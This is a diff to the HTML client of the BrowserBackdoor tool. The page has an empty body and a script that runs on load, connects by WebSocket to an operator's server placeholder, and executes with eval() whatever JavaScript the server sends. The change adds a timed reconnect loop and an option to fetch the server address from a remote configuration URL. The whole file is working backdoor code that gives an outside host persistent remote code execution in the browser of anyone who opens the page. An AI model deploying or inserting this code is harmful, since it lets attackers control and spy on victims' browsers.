@@ -1,36 +1,69 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <script>
-    /*
-     * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
-     * BrowserBackdoor - https://github.com/IMcPwn/browser-backdoor
-     * See the file 'LICENSE' for copying permission
-     */
-    (function connect() {
-        if ("WebSocket" in window)
-        {
-            // Change host and port to where you're hosting
-            // the WebSocket server.
-            // Also change ws:// to wss:// if secure is enabled on the
-            // server.
-            ws = new WebSocket("ws://your-server-here:1234");
-            ws.onmessage = function(evt)
-            {
-                if (ws.readyState === 1) {
-                    // eval the remote message.
-                    eval(evt.data);
+        /*
+         * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
+         * BrowserBackdoor - https://github.com/IMcPwn/browser-backdoor
+         * See the file 'LICENSE' for copying permission
+         */
+        // WebSocket connection
+        var ws;
+
+        function wsConnect(url) {
+            if ("WebSocket" in window) {
+                ws = new WebSocket(url);
+                ws.onmessage = function(evt) {
+                    if (ws.readyState === 1) {
+                        eval(evt.data);
+                    }
+                };
+                ws.onclose = function() {
+                    ws = null;
+                };
+            }
+        }
+
+        function pullConfig(url) {
+            var request = new XMLHttpRequest();
+            request.open('get', url, false);
+            request.send();
+
+            if (request.readyState === 4 && request.status === 200) {
+                return request.responseText;
+            }
+        }
+
+        function main() {
+            // Change to the host and port of the listening server.
+            // Change ws:// to wss:// if secure is enabled on the server.
+            var url = "ws://your-server-here:1234";
+            // Change to the reconnect timeout in milliseconds
+            var timeout = 10000;
+
+            // Change to the configuration URL if you are using this option.
+            // Leave it blank if you are not using it.
+            var configURL = "";
+
+            setInterval(function() {
+                if (!ws) {
+                    if (configURL) {
+                        var response = pullConfig(configURL);
+                        if (response) {
+                            url = response;
+                        }
+                    }
+                    wsConnect(url);
                 }
-            };
-            ws.onclose = function()
-            {
-                // Reconnect after 10 seconds.
-                setTimeout(connect, 10000);
-            };
-       }
-    })();
+            }, timeout);
+        }
+
+        main();
     </script>
 </head>
+
 <body>
 </body>
+
 </html>
